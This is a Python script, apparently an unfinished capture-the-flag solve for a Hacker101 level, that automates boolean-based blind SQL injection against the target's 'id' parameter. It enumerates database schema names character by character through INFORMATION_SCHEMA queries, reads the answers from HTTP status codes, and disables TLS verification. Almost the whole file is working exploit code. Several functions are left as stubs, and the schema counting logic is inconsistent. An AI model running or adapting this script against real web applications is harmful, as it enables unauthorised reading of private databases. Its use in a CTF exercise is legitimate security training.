from requests import get
import string
import urllib3
from typing import List

urllib3.disable_warnings()

class Table:
    def __init__(self, table_name:str, columns:list, rows:List[list] = list()):
        self.TABLE_NAME = table_name
        self.COLUMNS = columns
        if False in [len(row) == len(columns) for row in rows]:
            raise TypeError()
        
        self.TABLE = {
            columns[i]:rows[i] for i in range(len(columns)) 
        }

    def add_row(self, row:list):
        if len(self.TABLE.keys()) != len(row):
            raise TypeError()
        else:
            for i in range(len(row)):
                self.TABLE[self.COLUMNS[i]] = row[i]


class Schema:
    def __init__(self, schema_name:str):
        self.SCHEMA_NAME = schema_name
        self.SCHEMA_TABLES = []


    def add_table(self, table_name, columns, rows:List[list] = list()):
        if table_name.lower() not in [table.TABLE_NAME.lower() for table in self.SCHEMA_TABLES]:
            self.SCHEMA_TABLES.append(
                Table(table_name, columns, rows)
            )

    def draw_schema(self, column_size = 20):
        column_max_leng = column_size


BASE_URL = 'https://08d9880a384777322d0e2df7db7e5215.ctf.hacker101.com/fetch'

def probe_sqli(url:str, payload:str, param_to_inject:str = None, string_to_change:str = '[TO_REPLACE]',):
    if url is None :
        url = BASE_URL

    if param_to_inject:    
        response = get(f"{url}?{param_to_inject}={payload}", verify=False)
    else:
        response = get(url.replace(string_to_change, payload), verify=False)
        
    return response.status_code


def get_schemas(url:str, param_to_inject:str):
    chars =  string.digits + string.ascii_lowercase + '._'
    schemas_found = ['information_schema', 'level5', 'mysql', 'performance_schema']

    schemas_counter = 0
    found = False
    while not found:
        payload = (
            f"0 OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) > {schemas_counter}"
        )

        print(f"Counting schemas {schemas_counter}", end = '\r')

        test = probe_sqli(
            url, 
            param_to_inject = param_to_inject,
            payload = payload
        )

        if test != 200:
            print(f"[+] {schemas_counter} Schemas Found!")
            found = not found
        else:
            schemas_counter += 1 

    while schemas_counter > 0:
        # Finding each SCHEMA_NAME
        schema_found = False
        CHARS_FOUND = ''

        if len(schemas_found)>0: 
            exception_schemas = ' AND '.join([f"LOWER(SCHEMA_NAME) != '{sch.lower()}'" for sch in schemas_found]) + ' AND '
            print (f'Exception schemas included at query: {exception_schemas}')
        else:
            exception_schemas = ''

        while not schema_found:

            for c in chars:

                payload = (
                    f"0 OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE {exception_schemas}LOWER(SCHEMA_NAME) LIKE '{CHARS_FOUND}{c}%') > 0"
                )
        
                testi = probe_sqli(
                    url, 
                    param_to_inject = param_to_inject,
                    payload = payload
                )

                
                print(f'Testing SCHEMA: {CHARS_FOUND}{c} | Result: {testi}', end = '\r')

                if testi == 200:
                    CHARS_FOUND += c
                    may_end_payload = (
                        f"0 OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE {exception_schemas}SCHEMA_NAME = '{CHARS_FOUND}') > 0"
                    )
                    test_end = probe_sqli(
                        url, 
                        param_to_inject = param_to_inject,
                        payload = may_end_payload
                    ) 
                    if test_end == 200:
                        print(f'\n[+] Schema Found: {CHARS_FOUND}\n')
                        schemas_found.append(CHARS_FOUND)
                        schema_found = not schema_found
                    break

            if CHARS_FOUND == '':
                break

        schemas_counter -= 4

    return schemas_found

def get_schema_columns(url:str, params_to_inject:str):
    schemas = get_schemas(url, params_to_inject)

    for schema in schemas:
        columns_counter = 0
        found = False
        while not found:

            payload = (
                f"0 OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE SCHEMA_NAME = '{schema}') > {columns_counter}"
            )

            found = not found


schemas_name = get_schemas(BASE_URL, 'id')

def loop_to_find(
        url,
        param_to_inject,
        include_digits:bool = True, 
        include_upper:bool = True, 
        include_lower:bool = True, 
        include_chars:bool = False
    ):
    chars = ''
    if include_lower:
        chars += string.ascii_lowercase
    if include_upper:
        chars += string.ascii_uppercase
    if include_digits:
        chars += string.digits
    if include_chars:
        chars +=  '.,\/\\-+=)(*^$&)'

    
    


    
    